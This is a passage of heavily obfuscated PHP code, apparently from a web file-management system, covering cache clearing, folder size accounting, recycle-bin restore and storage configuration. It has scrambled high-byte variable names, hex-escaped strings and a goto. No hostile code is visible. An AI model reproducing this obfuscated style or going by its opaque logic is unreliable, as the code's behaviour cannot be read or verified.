self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Áı÷‡¯ò[535] . $™îÕ´¥]); unset(self::$cachePathInfoMore[$™îÕ´¥]); unset(self::$cachePathInfo[$Áı÷‡¯ò[2296] . $™îÕ´¥]); unset(self::$cachePathInfo[$Áı÷‡¯ò[2297] . $™îÕ´¥]); } public function metaSet($Ÿ×“¼Ñ¾, $ÈåºÄ³ = null, $¡Ğ–îÍë = null) { $·˜ıİ» = parent::metaSet($Ÿ×“¼Ñ¾, $ÈåºÄ³, $¡Ğ–îÍë); if ($·˜ıİ») { $this->sourceCacheClear($Ÿ×“¼Ñ¾); } return $·˜ıİ»; } public function pathInfoByPath($™‰å¸û‰, $‘×˜€Ç) { $ù•çÆ¸‰ =& $_SERVER[¶Ô„œ…¯]; $Åâ²šæ¼ = !$‘×˜€Ç ? array() : explode($ù•çÆ¸‰[8], trim($‘×˜€Ç, $ù•çÆ¸‰[8])); $«¶ûÑüñ = $™‰å¸û‰; foreach ($Åâ²šæ¼ as $›¹”ËòÏ) { $Ÿ÷–“¶¶ = array($ù•çÆ¸‰[192] => $«¶ûÑüñ, $ù•çÆ¸‰[32] => $›¹”ËòÏ); $î É³€˜ = $this->field($ù•çÆ¸‰[2298])->where($Ÿ÷–“¶¶)->select(); if (!$î É³€˜) { return !1; } $î É³€˜ = array_sort_by($î É³€˜, $ù•çÆ¸‰[507]); $«¶ûÑüñ = $î É³€˜[0][$ù•çÆ¸‰[193]]; } $ÍÙ÷šÆ = $this->sourceInfo($«¶ûÑüñ); $this->pathInfoFilter($ÍÙ÷šÆ); return $ÍÙ÷šÆ; } protected function updateModifyTime($³òÜÌ‡¹) { $ø¡ÔŸşŸ =& $_SERVER[¶Ô„œ…¯]; $‚§…ö¤Õ = defined($ø¡ÔŸşŸ[2207]) ? USER_ID : 0; if (!$³òÜÌ‡¹) { return; } if (!is_array($³òÜÌ‡¹)) { $³òÜÌ‡¹ = array($³òÜÌ‡¹); } foreach ($³òÜÌ‡¹ as $¸şùßÏç => $š¸µ‹ è) { $³òÜÌ‡¹[$¸şùßÏç] = intval($š¸µ‹ è); $this->sourceCacheClear($š¸µ‹ è); } $ä‰Çº­• = array($ø¡ÔŸşŸ[193] => array($ø¡ÔŸşŸ[7], $³òÜÌ‡¹)); $´”­ÒØË = array($ø¡ÔŸşŸ[656] => $‚§…ö¤Õ, $ø¡ÔŸşŸ[500] => time()); $this->where($ä‰Çº­•)->save($´”­ÒØË); } public function folderSizeReset($÷Å·šöÒ, $×±èÀİ‡ = false) { $“óÒ¶ŞÅ =& $_SERVER[¶Ô„œ…¯]; if ($this->statusIgnoreResetSpace) { return; } $ò³Ó­¾ = $this->sourceInfo($÷Å·šöÒ); $ÎÎ¯ªòÆ = $“óÒ¶ŞÅ[2299] . $÷Å·šöÒ; CacheLock::lock($ÎÎ¯ªòÆ, 20); if ($×±èÀİ‡ === !1) { $this->sourceCacheClear($÷Å·šöÒ); $ò³Ó­¾ = $this->sourceInfo($÷Å·šöÒ); $â‰µŞÏ‘ = array($“óÒ¶ŞÅ[479] => $÷Å·šöÒ, $“óÒ¶ŞÅ[506] => 0); $ŒÚ« ƒ¦ = $this->where($â‰µŞÏ‘)->sum($“óÒ¶ŞÅ[79]); $×±èÀİ‡ = intval($ŒÚ« ƒ¦) - intval($ò³Ó­¾[$“óÒ¶ŞÅ[79]]); } if ($×±èÀİ‡ == 0) { return CacheLock::unlock($ÎÎ¯ªòÆ); } $›î”½Ñ« = $this->parentLevelArray($ò³Ó­¾[$“óÒ¶ŞÅ[586]]); if (!$›î”½Ñ«) { $›î”½Ñ« = array(); } $›î”½Ñ«[] = $ò³Ó­¾[$“óÒ¶ŞÅ[193]]; $â‰µŞÏ‘ = array($“óÒ¶ŞÅ[193] => array($“óÒ¶ŞÅ[494], $›î”½Ñ«)); if ($×±èÀİ‡ < 0) { $â‰µŞÏ‘[$“óÒ¶ŞÅ[79]] = array($“óÒ¶ŞÅ[1099], abs($×±èÀİ‡)); } $this->where($â‰µŞÏ‘)->setAdd($“óÒ¶ŞÅ[79], $×±èÀİ‡); CacheLock::unlock($ÎÎ¯ªòÆ); $ùâã°©Ö = $“óÒ¶ŞÅ[2300] . $ò³Ó­¾[$“óÒ¶ŞÅ[190]] . $“óÒ¶ŞÅ[4] . $ò³Ó­¾[$“óÒ¶ŞÅ[571]]; $¯ƒÍı· = array($ò³Ó­¾[$“óÒ¶ŞÅ[190]], $ò³Ó­¾[$“óÒ¶ŞÅ[571]]); TaskRun::timeLimitCall($ùâã°©Ö, $“óÒ¶ŞÅ[2301], $¯ƒÍı·, 1.5); } public function folderSizeResetChildren($ëÇ´ÇñÅ) { $Ô›êÉ’ =& $_SERVER[¶Ô„œ…¯]; $this->sourceCacheClear($ëÇ´ÇñÅ); $ŒÙª›úè = $this->sourceInfo($ëÇ´ÇñÅ); $ŞÛ²ßå  = array($Ô›êÉ’[651] => 1, $Ô›êÉ’[654] => $ŒÙª›úè[$Ô›êÉ’[571]], $Ô›êÉ’[657] => array($Ô›êÉ’[617], $ŒÙª›úè[$Ô›êÉ’[586]] . $ëÇ´ÇñÅ . $Ô›êÉ’[618])); $óòóŠ¸— = $Ô›êÉ’[2302]; $‚Ï…¶ù = $this->field($óòóŠ¸—)->where($ŞÛ²ßå )->select(); $ŞÛ²ßå [$Ô›êÉ’[487]] = 0; $Š“Òˆá = $this->field($óòóŠ¸—)->where($ŞÛ²ßå )->select(); if (!$Š“Òˆá) { return; } $‚Ï…¶ù[] = $ŒÙª›úè; $‚Ï…¶ù = array_to_keyvalue($‚Ï…¶ù, $Ô›êÉ’[193]); foreach ($‚Ï…¶ù as $°î¤ÁÃÎ => $¢÷Ù¯Ò¢) { $‚Ï…¶ù[$°î¤ÁÃÎ][$Ô›êÉ’[2303]] = $‚Ï…¶ù[$°î¤ÁÃÎ][$Ô›êÉ’[79]]; $‚Ï…¶ù[$°î¤ÁÃÎ][$Ô›êÉ’[79]] = 0; } foreach ($Š“Òˆá as $¢÷Ù¯Ò¢) { $âşÖøœ = $¢÷Ù¯Ò¢[$Ô›êÉ’[192]] . $Ô›êÉ’[12]; if (!isset($‚Ï…¶ù[$âşÖøœ])) { continue; } if ($¢÷Ù¯Ò¢[$Ô›êÉ’[507]] == $‚Ï…¶ù[$âşÖøœ][$Ô›êÉ’[507]]) { $‚Ï…¶ù[$âşÖøœ][$Ô›êÉ’[79]] += $¢÷Ù¯Ò¢[$Ô›êÉ’[79]]; } } foreach ($‚Ï…¶ù as $¢÷Ù¯Ò¢) { $¯€Ø•€ = $this->parentLevelArray($¢÷Ù¯Ò¢[$Ô›êÉ’[586]]); foreach ($¯€Ø•€ as $âşÖøœ) { $âşÖøœ = $âşÖøœ . $Ô›êÉ’[12]; if (!isset($‚Ï…¶ù[$âşÖøœ])) { continue; } if ($¢÷Ù¯Ò¢[$Ô›êÉ’[507]] == $‚Ï…¶ù[$âşÖøœ][$Ô›êÉ’[507]]) { $‚Ï…¶ù[$âşÖøœ][$Ô›êÉ’[79]] += $¢÷Ù¯Ò¢[$Ô›êÉ’[79]]; } } } $Ùµ÷ôÕà = array(); foreach ($‚Ï…¶ù as $¢÷Ù¯Ò¢) { if ($¢÷Ù¯Ò¢[$Ô›êÉ’[79]] == $¢÷Ù¯Ò¢[$Ô›êÉ’[2303]]) { continue; } $Ùµ÷ôÕà[] = array($Ô›êÉ’[193], $¢÷Ù¯Ò¢[$Ô›êÉ’[193]], $Ô›êÉ’[79], $¢÷Ù¯Ò¢[$Ô›êÉ’[79]]); } $this->saveAll($Ùµ÷ôÕà); } public function userSpaceReset($÷ğÓş¥Ğ = false) { $€µ§Ûëº =& $_SERVER[¶Ô„œ…¯]; $à«İ· ô = $this->where(array($€µ§Ûëº[190] => self::TYPE_USER, $€µ§Ûëº[571] => $÷ğÓş¥Ğ, $€µ§Ûëº[487] => 0))->sum($€µ§Ûëº[79]); $à«İ· ô = !$à«İ· ô || $à«İ· ô <= 0 ? 0 : $à«İ· ô; Model($€µ§Ûëº[579])->userEdit($÷ğÓş¥Ğ, array($€µ§Ûëº[1968] => $à«İ· ô)); } public function targetSpaceUpdate($ñ¦úÇ“¡, $“£„ç“‘) { $²¿­¶… =& $_SERVER[¶Ô„œ…¯]; if (!$“£„ç“‘) { return; } if (!in_array($ñ¦úÇ“¡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ó×ÆæĞš = $this->targetSpaceSize($ñ¦úÇ“¡, $“£„ç“‘); if ($ñ¦úÇ“¡ == self::TYPE_USER) { Model($²¿­¶…[579])->userEdit($“£„ç“‘, array($²¿­¶…[1968] => $ó×ÆæĞš)); } else { if ($ñ¦úÇ“¡ == self::TYPE_GROUP) { Model($²¿­¶…[587])->groupEdit($“£„ç“‘, array($²¿­¶…[1968] => $ó×ÆæĞš)); } } } public function targetSpaceSize($èš¥ÊâÈ, $´¦©¶ê) { $×İ£Ôå™ =& $_SERVER[¶Ô„œ…¯]; $†™†œåÆ = 0; $ÅŠòÄîÛ = $this->targetSourceRoot($èš¥ÊâÈ, $´¦©¶ê, !0); foreach ($ÅŠòÄîÛ as $­ö‹µØ†) { if (!$­ö‹µØ†) { continue; } $†™†œåÆ += floatval($­ö‹µØ†[$×İ£Ôå™[79]]); $Á¿¡­Õ² = array($×İ£Ôå™[657] => array($×İ£Ôå™[617], $×İ£Ôå™[595] . $­ö‹µØ†[$×İ£Ôå™[193]] . $×İ£Ôå™[618])); $î¡×€©‘ = Model($×İ£Ôå™[505])->field($×İ£Ôå™[493])->where($Á¿¡­Õ²)->select(); $î¡×€©‘ = array_to_keyvalue($î¡×€©‘, $×İ£Ôå™[12], $×İ£Ôå™[193]); $î¡×€©‘ = array_unique(array_filter($î¡×€©‘)); if ($î¡×€©‘) { $Á¿¡­Õ² = array($×İ£Ôå™[493] => array($×İ£Ôå™[494], $î¡×€©‘)); $†™†œåÆ += floatval($this->where($Á¿¡­Õ²)->sum($×İ£Ôå™[79])); } } $†™†œåÆ = !$†™†œåÆ || $†™†œåÆ <= 0 ? 0 : $†™†œåÆ; return $†™†œåÆ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($‰®œÕÅœ) { return $this->fileTypeProfile($‰®œÕÅœ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ê”Ä§»ó) { return $this->fileTypeProfile($Ê”Ä§»ó, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Óì‹„Ï, $ÔØñºº‘) { $’îŒ³Ú =& $_SERVER[¶Ô„œ…¯]; $ù—Ã‰¯ = $’îŒ³Ú[2304] . $Óì‹„Ï . $’îŒ³Ú[11] . $ÔØñºº‘; $™õ˜‡×¼ = Cache::get($ù—Ã‰¯); if ($™õ˜‡×¼) { return $™õ˜‡×¼; } $×Ğ—æŠŒ = array($’îŒ³Ú[651] => 0); if ($Óì‹„Ï != !1) { $×Ğ—æŠŒ[$’îŒ³Ú[571]] = $Óì‹„Ï; $×Ğ—æŠŒ[$’îŒ³Ú[190]] = $ÔØñºº‘; } $„„Àø½ = array(); $„„Àø½[$’îŒ³Ú[2305]] = array($’îŒ³Ú[2306] => LNG($’îŒ³Ú[2305]), $’îŒ³Ú[2307] => $this->where($×Ğ—æŠŒ)->count(), $’îŒ³Ú[622] => $this->where($×Ğ—æŠŒ)->sum($’îŒ³Ú[79])); $Æ•¼Ú“ = KodIO::fileTypeList(); foreach ($Æ•¼Ú“ as $£öƒà•¾ => $¹¤Çä˜—) { $×Ğ—æŠŒ[$’îŒ³Ú[488]] = $this->fileTypeWhere($£öƒà•¾); $„„Àø½[$£öƒà•¾] = array($’îŒ³Ú[2306] => $¹¤Çä˜—[$’îŒ³Ú[32]], $’îŒ³Ú[2307] => $this->where($×Ğ—æŠŒ)->count(), $’îŒ³Ú[622] => $this->where($×Ğ—æŠŒ)->sum($’îŒ³Ú[79])); } Cache::set($ù—Ã‰¯, $„„Àø½, 1200); return $„„Àø½; } public function fileNameExist($³®ËÔåÉ, $Ãâ°ãò¬) { $ÆØğÃˆí =& $_SERVER[¶Ô„œ…¯]; $ó±òŸæš = $this->field($ÆØğÃˆí[2308])->where(array($ÆØğÃˆí[192] => $³®ËÔåÉ, $ÆØğÃˆí[32] => $Ãâ°ãò¬, $ÆØğÃˆí[507] => 0))->find(); return is_array($ó±òŸæš) ? $ó±òŸæš[$ÆØğÃˆí[193]] : !1; } public function childList($Òè†Á§ñ) { $åÀœøŒı =& $_SERVER[¶Ô„œ…¯]; $½ÑĞç ß = $åÀœøŒı[2281] . $Òè†Á§ñ; if (isset(self::$cacheChildList[$½ÑĞç ß])) { return self::$cacheChildList[$½ÑĞç ß]; } $„†»¤ı³ = array($åÀœøŒı[192] => intval($Òè†Á§ñ), $åÀœøŒı[507] => 0); $Áï¯Ö·ë = $this->where($„†»¤ı³)->select(); $Áï¯Ö·ë = $Áï¯Ö·ë ? $Áï¯Ö·ë : array(); self::$cacheChildList[$½ÑĞç ß] = $Áï¯Ö·ë; foreach ($Áï¯Ö·ë as $— ™šõü) { $½ÑĞç ß = $åÀœøŒı[535] . $— ™šõü[$åÀœøŒı[193]]; self::$cacheSourceInfo[$½ÑĞç ß] = $— ™šõü; } return $Áï¯Ö·ë; } public function fileNameAuto($ôÁ‚ĞÀ, $ïíŞÆÎ€, $±çØéŸ½ = REPEAT_RENAME, $Şˆ›Èë€ = false) { $ƒºº›‚Ÿ =& $_SERVER[¶Ô„œ…¯]; $º¨Å€Ö¬ = get_path_ext($ïíŞÆÎ€); $Èº¾øÌå = $º¨Å€Ö¬ ? get_path_ext_name($ïíŞÆÎ€) . $ƒºº›‚Ÿ[2309] . $º¨Å€Ö¬ : $ïíŞÆÎ€ . $ƒºº›‚Ÿ[462]; $‘´ì¨ = array($ƒºº›‚Ÿ[192] => $ôÁ‚ĞÀ, $ƒºº›‚Ÿ[507] => 0, $ƒºº›‚Ÿ[32] => array($ƒºº›‚Ÿ[461], $Èº¾øÌå)); $æ‰Æ¬ú« = $this->field($ƒºº›‚Ÿ[32])->where($‘´ì¨)->select(); $ØŞÄÒŸ = array_to_keyvalue($æ‰Æ¬ú«, $ƒºº›‚Ÿ[12], $ƒºº›‚Ÿ[32]); return $this->fileNameAutoGet($ØŞÄÒŸ, $ïíŞÆÎ€, $±çØéŸ½, $Şˆ›Èë€); } public function fileNameAutoGet($£ùÒ¾©, $£ÂÇ‰¸, $ƒ¼‰Ê…Ã, $Î¶Ÿü‘É) { $ÛíÆ÷Ï® =& $_SERVER[¶Ô„œ…¯]; if ($ƒ¼‰Ê…Ã == REPEAT_REPLACE || !$£ùÒ¾© || !in_array_not_case($£ÂÇ‰¸, $£ùÒ¾©) || $Î¶Ÿü‘É && $ƒ¼‰Ê…Ã != REPEAT_RENAME_FOLDER) { return $£ÂÇ‰¸; } if ($ƒ¼‰Ê…Ã == REPEAT_SKIP) { return !1; } $İ§ãËé = $ÛíÆ÷Ï®[10] . get_path_ext($£ÂÇ‰¸); $İ§ãËé = $İ§ãËé == $ÛíÆ÷Ï®[10] || $Î¶Ÿü‘É ? $ÛíÆ÷Ï®[12] : $İ§ãËé; for ($ŠÙÜÁß = 1; $ŠÙÜÁß <= count($£ùÒ¾©) + 1; $ŠÙÜÁß++) { $®»·µ = substr($£ÂÇ‰¸, 0, strlen($£ÂÇ‰¸) - strlen($İ§ãËé)); $ùš«ö¬ = $®»·µ . "\50{$ŠÙÜÁß}\x29{$İ§ãËé}"; if (!in_array_not_case($ùš«ö¬, $£ùÒ¾©)) { return $ùš«ö¬; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\145\x5f\x72\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\124\151\155\145", "\x74\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\146\165\x6e\x63\x74\151\157\x6e")); public function listData($ò¾ô¹÷˜ = false) { $íŸíÍ«á =& $_SERVER[¶Ô„œ…¯]; $ò¾ô¹÷˜ = $ò¾ô¹÷˜ ? $ò¾ô¹÷˜ : USER_ID; $÷…©çàÒ = $this->where(array($íŸíÍ«á[1771] => $ò¾ô¹÷˜))->select(); return array_to_keyvalue($÷…©çàÒ, $íŸíÍ«á[12], $íŸíÍ«á[193]); } public function moveToRecycle($Äˆ£ûŠ×) { $ñôĞ™€´ =& $_SERVER[¶Ô„œ…¯]; $— ”æ°ä = Model($ñôĞ™€´[1428]); $Æ¨ãàŒ = $— ”æ°ä->sourceInfo($Äˆ£ûŠ×); if (!$Æ¨ãàŒ || $Æ¨ãàŒ[$ñôĞ™€´[507]] == $ñôĞ™€´[91]) { return; } $«™—ï„Ù = array($ñôĞ™€´[493] => $Äˆ£ûŠ×, $ñôĞ™€´[1771] => USER_ID, $ñôĞ™€´[653] => $Æ¨ãàŒ[$ñôĞ™€´[190]], $ñôĞ™€´[654] => $Æ¨ãàŒ[$ñôĞ™€´[571]], $ñôĞ™€´[657] => $Æ¨ãàŒ[$ñôĞ™€´[586]]); $this->add($«™—ï„Ù); $this->recycleMove($Äˆ£ûŠ×, 1); if ($Æ¨ãàŒ[$ñôĞ™€´[487]] == $ñôĞ™€´[91]) { $àÛ¹»èĞ = array($ñôĞ™€´[657] => array($ñôĞ™€´[617], $Æ¨ãàŒ[$ñôĞ™€´[586]] . $Äˆ£ûŠ× . $ñôĞ™€´[618])); $— ”æ°ä->where($àÛ¹»èĞ)->setField($ñôĞ™€´[507], 1); } } public function clear() { $this->remove(!1); } public function remove($¼óê˜ö¥ = false, $°¡æí³è = false) { $Óß˜ş”º =& $_SERVER[¶Ô„œ…¯]; $°¡æí³è = $°¡æí³è ? $°¡æí³è : USER_ID; $¹ßÎ×  = Model($Óß˜ş”º[1428]); $·˜ÔØ‚û = $this->listData($°¡æí³è); $¼óê˜ö¥ = $¼óê˜ö¥ === !1 ? !1 : $¼óê˜ö¥; $·ÁŞ¦³¸ = array(); foreach ($·˜ÔØ‚û as $ÄÂèÅş¦) { if ($¼óê˜ö¥ != !1 && !in_array($ÄÂèÅş¦, $¼óê˜ö¥)) { continue; } $µ”™ÆÆ¼ = $¹ßÎ× ->sourceInfo($ÄÂèÅş¦); $¹ßÎ× ->remove($ÄÂèÅş¦, !1); $Úê‹Êã = $µ”™ÆÆ¼[$Óß˜ş”º[190]] . $Óß˜ş”º[11] . $µ”™ÆÆ¼[$Óß˜ş”º[571]]; $·ÁŞ¦³¸[$Úê‹Êã] = array($Óß˜ş”º[653] => $µ”™ÆÆ¼[$Óß˜ş”º[190]], $Óß˜ş”º[571] => $µ”™ÆÆ¼[$Óß˜ş”º[571]]); $this->where(array($Óß˜ş”º[193] => $ÄÂèÅş¦))->delete(); } foreach ($·ÁŞ¦³¸ as $œß…ûÑ) { $¹ßÎ× ->targetSpaceUpdate($œß…ûÑ[$Óß˜ş”º[190]], $œß…ûÑ[$Óß˜ş”º[571]]); } } public function restore($¿ÄÇÀÍŠ = false) { $Šğšû¢• = $this->listData(); $this->_restoreSource($Šğšû¢•, $¿ÄÇÀÍŠ); } public function removeUserAll($¥µ¢ËîÚ) { $this->remove(!1, $¥µ¢ËîÚ); } public function restoreItem($œî¢¯Ÿ®) { $this->_restoreSource(array($œî¢¯Ÿ®), array($œî¢¯Ÿ®)); } private function _restoreSource($³‰®ÀÂ«, $ãû‹­º) { $ÍÛü×©Ü =& $_SERVER[¶Ô„œ…¯]; $İ´ºª€ = Model($ÍÛü×©Ü[1428]); $ãû‹­º = $ãû‹­º == !1 ? !1 : $ãû‹­º; if (!$³‰®ÀÂ«) { return !0; } $âÁ„Ìé = array(); foreach ($³‰®ÀÂ« as $°É„İ†Ö) { if ($ãû‹­º != !1 && !in_array($°É„İ†Ö, $ãû‹­º)) { continue; } $«ìÖ¨˜ = $İ´ºª€->sourceInfo($°É„İ†Ö); $‡†Ëş§° = $İ´ºª€->sourceInfo($«ìÖ¨˜[$ÍÛü×©Ü[192]]); if ($‡†Ëş§°[$ÍÛü×©Ü[507]] == $ÍÛü×©Ü[91]) { continue; } $İ´ºª€->lockMoveStart($°É„İ†Ö); $this->recycleMove($°É„İ†Ö, 0); if ($«ìÖ¨˜[$ÍÛü×©Ü[487]] == $ÍÛü×©Ü[91]) { $¨Çœğ’” = array($ÍÛü×©Ü[657] => array($ÍÛü×©Ü[617], $«ìÖ¨˜[$ÍÛü×©Ü[586]] . $°É„İ†Ö . $ÍÛü×©Ü[618])); $İ´ºª€->where($¨Çœğ’”)->setField($ÍÛü×©Ü[507], 0); $this->restoreFolderChildren($°É„İ†Ö, $³‰®ÀÂ«); } $this->where(array($ÍÛü×©Ü[193] => $°É„İ†Ö))->delete(); $İ´ºª€->folderSizeReset($«ìÖ¨˜[$ÍÛü×©Ü[192]]); $âÁ„Ìé[] = $«ìÖ¨˜[$ÍÛü×©Ü[192]]; if ($«ìÖ¨˜[$ÍÛü×©Ü[487]] == $ÍÛü×©Ü[91]) { $âÁ„Ìé[] = $°É„İ†Ö; } $İ´ºª€->lockMoveEnd($°É„İ†Ö); } $İ´ºª€->updateModifyTime($âÁ„Ìé); } private function restoreFolderChildren($Íøİ¥ïÆ, $«Ãù¸¾â) { $³¥ëÚ„¦ =& $_SERVER[¶Ô„œ…¯]; $å˜ææ¢¼ = Model($³¥ëÚ„¦[1428]); $šà¸ëúâ = array($³¥ëÚ„¦[193] => array($³¥ëÚ„¦[7], array())); foreach ($«Ãù¸¾â as $¿É•¥°¦) { if ($¿É•¥°¦ == $Íøİ¥ïÆ) { continue; } if (!$å˜ææ¢¼->isParentOf($Íøİ¥ïÆ, $¿É•¥°¦)) { continue; } $ËÎÅı™ë = $å˜ææ¢¼->sourceInfo($¿É•¥°¦); if ($ËÎÅı™ë[$³¥ëÚ„¦[487]] == $³¥ëÚ„¦[91]) { $šà¸ëúâ[] = array($³¥ëÚ„¦[657] => array($³¥ëÚ„¦[617], $ËÎÅı™ë[$³¥ëÚ„¦[586]] . $¿É•¥°¦ . $³¥ëÚ„¦[618])); } else { $šà¸ëúâ[$³¥ëÚ„¦[193]][1][] = $¿É•¥°¦; } } if (!$šà¸ëúâ[$³¥ëÚ„¦[193]][1]) { unset($šà¸ëúâ[$³¥ëÚ„¦[193]]); } if (!$šà¸ëúâ) { return; } if (is_array($šà¸ëúâ[$³¥ëÚ„¦[193]]) && is_array($šà¸ëúâ[$³¥ëÚ„¦[193]][1])) { $šà¸ëúâ[$³¥ëÚ„¦[193]][1] = array_unique($šà¸ëúâ[$³¥ëÚ„¦[193]][1]); } $šà¸ëúâ[$³¥ëÚ„¦[1084]] = $³¥ëÚ„¦[2082]; $å˜ææ¢¼->where($šà¸ëúâ)->setField($³¥ëÚ„¦[507], 1); } private function recycleMove($­ÀÄØĞ, $ØóÀ˜Ã = 1) { $î‘²à¿¢ =& $_SERVER[¶Ô„œ…¯]; $¾¤¿Âñ = Model($î‘²à¿¢[1428]); $ÛÒğÇö = Model($î‘²à¿¢[2310]); $Š Áï‰ = array($î‘²à¿¢[193] => $­ÀÄØĞ); if ($ØóÀ˜Ã) { $¾¤¿Âñ->where($Š Áï‰)->setField($î‘²à¿¢[507], 1); $ÛÒğÇö->eventRecycle($­ÀÄØĞ, $î‘²à¿¢[2311]); } else { $ËñšÂ’ø = $¾¤¿Âñ->where($Š Áï‰)->find(); $ÏÇ¾¿¦‡ = $ËñšÂ’ø[$î‘²à¿¢[487]] == $î‘²à¿¢[91]; $û¸Ç•È = $¾¤¿Âñ->fileNameAuto($ËñšÂ’ø[$î‘²à¿¢[192]], $ËñšÂ’ø[$î‘²à¿¢[32]], REPEAT_RENAME_FOLDER, $ÏÇ¾¿¦‡); if ($û¸Ç•È != $ËñšÂ’ø[$î‘²à¿¢[32]]) { $¾¤¿Âñ->rename($­ÀÄØĞ, $û¸Ç•È); } $¾¤¿Âñ->where($Š Áï‰)->setField($î‘²à¿¢[507], 0); $ÛÒğÇö->eventRecycle($­ÀÄØĞ, $î‘²à¿¢[2312]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\163\157\165\x72\143\145\123\145\143\162\x65\164\x4c\x69\163\164"; public $field = array("\x73\157\165\x72\x63\145\111\104", "\164\171\x70\145\111\104", "\143\162\x65\141\x74\x65\125\x73\145\x72"); } goto E‹ä ‹¾ô„; E‹ä ‹¾ô„: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\163\x74\x6f\162\141\x67\145\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\163\x69\x7a\145\115\141\170", "\x73\171\x73\164\145\155", "\144\x65\146\141\x75\x6c\164", "\x64\x72\151\166\145\x72", "\143\x6f\156\146\x69\x67"); public function listData($»¬ïòß = false, $ö¦İ½›’ = "\155\157\x64\x69\x66\171\x54\151\155\x65", $ÇÀğ²Ñ­ = false) { $¦´ëŞ´å =& $_SERVER[¶Ô„œ…¯]; $ÈØº‡åµ = parent::listData($»¬ïòß, $ö¦İ½›’, $ÇÀğ²Ñ­); if ($»¬ïòß) { return $ÈØº‡åµ; } $×Üª„„ = array(); if ($GLOBALS[$¦´ëŞ´å[2313]]) { $×Üª„„ = $this->ioSizeUseGet(array_to_keyvalue($ÈØº‡åµ, $¦´ëŞ´å[12], $¦´ëŞ´å[477])); } foreach ($ÈØº‡åµ as $Ã‡Ôı¶ => $Ú¡Õ¡‚€) { unset($ÈØº‡åµ[$Ã‡Ôı¶][$¦´ëŞ´å[6]]); $ÈØº‡åµ[$Ã‡Ôı¶][$¦´ëŞ´å[1968]] = isset($×Üª„„[$Ú¡Õ¡‚€[$¦´ëŞ´å[477]]]) ? $×Üª„„[$Ú¡Õ¡‚€[$¦´ëŞ´å[477]]] : 0; } return $ÈØº‡åµ; } public function ioSizeUseGet($­×¾´™) { $†ü­Ó¾Ø =& $_SERVER[¶Ô„œ…¯]; if (!$­×¾´™) { return array(); } $»Ìƒ¦…Ú = $†ü­Ó¾Ø[2314] . implode($†ü­Ó¾Ø[50], $­×¾´™); $¥¯‰Šé÷ = Cache::get($»Ìƒ¦…Ú); if ($¥¯‰Šé÷) { return $¥¯‰Šé÷; } $Ş¸·É¬ = array($†ü­Ó¾Ø[896] => $†ü­Ó¾Ø[477], $†ü­Ó¾Ø[2315] => $†ü­Ó¾Ø[79]); $ó®­Ö­˜ = array($†ü­Ó¾Ø[896] => array($†ü­Ó¾Ø[7], $­×¾´™)); $¥¯‰Šé÷ = Model($†ü­Ó¾Ø[868])->field($Ş¸·É¬)->where($ó®­Ö­˜)->group($†ü­Ó¾Ø[896])->select(); $¥¯‰Šé÷ = array_to_keyvalue($¥¯‰Šé÷, $†ü­Ó¾Ø[477], $†ü­Ó¾Ø[79]); Cache::set($»Ìƒ¦…Ú, $¥¯‰Šé÷, 600); return $¥¯‰Šé÷; } public function getConfig($¹°¹ªÇÆ) { $¥‡ç­˜µ = parent::listData($¹°¹ªÇÆ); $¯öÂÏ²Ó = _get($¥‡ç­˜µ, $_SERVER[¶Ô„œ…¯][6], array()); if ($¯öÂÏ²Ó && !is_array($¯öÂÏ²Ó)) { $¯öÂÏ²Ó = json_decode($¯öÂÏ²Ó, !0); } return $¯öÂÏ²Ó; } public function update($ÉÍá, $Š‘É¼œ) { $à¾Ê——¸ =& $_SERVER[¶Ô„œ…¯]; $”Ô»”¯€ = $Š‘É¼œ[$à¾Ê——¸[32]]; $å•éÈ•± = array_to_keyvalue(parent::listData(), $à¾Ê——¸[32]); if (isset($å•éÈ•±[$”Ô»”¯€]) && $å•éÈ•±[$”Ô»”¯€][$à¾Ê——¸[477]] != $ÉÍá) { return !1; } $this->checkPwd($ÉÍá, $Š‘É¼œ); if (isset($Š‘É¼œ[$à¾Ê——¸[2316]]) && $Š‘É¼œ[$à¾Ê——¸[2316]] == $à¾Ê——¸[91]) { $this->checkConfig($Š‘É¼œ); } unset($Š‘É¼œ[$à¾Ê——¸[2316]]); $¤‹´´â¦ = parent::update($ÉÍá, $Š‘É¼œ); if ($¤‹´´â¦ && $Š‘É¼œ[$à¾Ê——¸[37]]) { $˜Ş¯ìç³ = 0; foreach ($å•éÈ•± as $ÉÕë€©×) { if ($ÉÕë€©×[$à¾Ê——¸[37]] && $ÉÕë€©×[$à¾Ê——¸[477]] != $ÉÍá) { $˜Ş¯ìç³ = $ÉÕë€©×[$à¾Ê——¸[477]]; parent::update($ÉÕë€©×[$à¾Ê——¸[477]], array($à¾Ê——¸[37] => 0)); } } $this->updateBackup($ÉÍá, $˜Ş¯ìç³); } return $¤‹´´â¦; } public function add($¡¹’°¦³) { $Ö½Öİªı =& $_SERVER[¶Ô„œ…¯]; $ıÄö·àí = array_to_keyvalue(parent::listData(), $Ö½Öİªı[32]); if (isset($ıÄö·àí[$¡¹’°¦³[$Ö½Öİªı[32]]])) { return !1; } $this->checkConfig($¡¹’°¦³); $˜Å§æá§ = parent::insert($¡¹’°¦³); if ($˜Å§æá§ && $¡¹’°¦³[$Ö½Öİªı[37]]) { foreach ($ıÄö·àí as $Š€¾ø‚é) { if ($Š€¾ø‚é[$Ö½Öİªı[37]]) { parent::update($Š€¾ø‚é[$Ö½Öİªı[477]], array($Ö½Öİªı[37] => 0)); } } } return $˜Å§æá§; } public function updateBackup($Üù³€Ÿ, $¥ªÜ÷üï) { $â¯Üë‡¶ =& $_SERVER[¶Ô„œ…¯]; if (!$¥ªÜ÷üï) { return; } $…ŠµÖÖ™ = Model($â¯Üë‡¶[826])->config(); if ($…ŠµÖÖ™[$â¯Üë‡¶[1749]] != $â¯Üë‡¶[91] || 